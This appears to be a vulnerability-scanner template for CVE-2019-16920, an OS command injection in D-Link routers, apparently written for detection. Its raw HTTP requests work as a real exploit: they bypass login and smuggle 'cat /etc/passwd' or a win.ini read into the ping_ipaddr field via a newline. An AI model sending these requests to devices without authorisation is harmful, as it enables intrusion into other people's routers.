id: CVE-2019-16920
info:
  name: D-Link Routers - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    D-Link路由器操作系统命令注入漏洞
    D-Link DIR-655C等都是中国台湾友讯（D-Link）公司的一款无线路由器。

    多款D-Link产品中存在操作系统命令注入漏洞。攻击者可利用该漏洞注入命令，进而入侵系统。以下产品及版本受到影响：D-Link DIR-655C；DIR-866L；DIR-652；DHP-1565等。
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://www.dlink.com/
requests:
- matchers:
  - type: regex
    condition: or
    part: body
    regex:
    - 'root:.*:0:0:'
    - \[(font|extension|file)s\]
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /apply_sec.cgi HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    Referer: {{BaseURL}}

    html_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=62384
  - |
    POST /apply_sec.cgi HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    Referer: {{BaseURL}}/login_pic.asp
    Cookie: uid=1234123

    html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('cat /etc/passwd')}}
  - |
    POST /apply_sec.cgi HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    Referer: {{BaseURL}}/login_pic.asp
    Cookie: uid=1234123

    html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{{url_encode('type C:\\Windows\\win.ini')}}
